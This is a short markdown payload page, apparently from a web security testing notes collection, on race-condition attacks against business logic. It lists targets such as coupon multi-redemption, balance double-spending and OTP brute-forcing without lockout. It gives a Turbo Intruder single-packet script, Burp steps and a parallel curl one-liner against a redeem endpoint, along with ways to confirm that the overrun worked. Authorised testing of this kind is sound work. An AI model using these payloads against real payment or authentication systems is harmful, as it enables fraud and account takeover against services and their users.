---
title: "Payloads: Race Conditions"
type: payloads
tags: [payloads, race-condition, business-logic, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: Race Conditions

Concurrent requests to break a limit or state check (OWASP A04). Routed via the `hunt-bizlogic` skill. See [[race-conditions]].

## Targets (limit-overrun / TOCTOU)
```
redeem a coupon / gift card N times in parallel
withdraw / transfer balance twice (double-spend)
exceed a per-account quota, vote/like/rate-limit, invite limit
apply discount + place order simultaneously
OTP/2FA brute without lockout; password-reset token reuse
"single-use" link / one-time action used multiple times
multi-step state: submit step N while N-1 is mid-processing
```

## How to fire (near-simultaneous)
```
Burp Repeater: select requests -> "Send group in parallel (single-packet attack)"   # HTTP/2: ~20-30 reqs, 1 packet
Turbo Intruder: race-single-packet-attack.py  (gate -> openGate -> all hit together)
```
```python
# Turbo Intruder single-packet race
engine = RequestEngine(endpoint=target, concurrentConnections=1, engine=Engine.BURP2)
for i in range(30): engine.queue(request, gate='race1')
engine.openGate('race1')
```
```bash
# quick-and-dirty parallel curl
seq 30 | xargs -P30 -I_ curl -s -X POST https://t/redeem -d 'code=ABC' -b 'session=...'
```

## Confirm
```
result > expected single-request outcome:
  2x balance credited, coupon used 3x, quota 11/10, 2 accounts from one invite
```

## Real-world
Single-packet-attack races (Kettle, 2023) reliably defeat HTTP/2 backends: gift-card/coupon multi-redeem, balance double-spend, and OTP-brute-without-lockout are repeated high-impact findings on payment/auth flows.
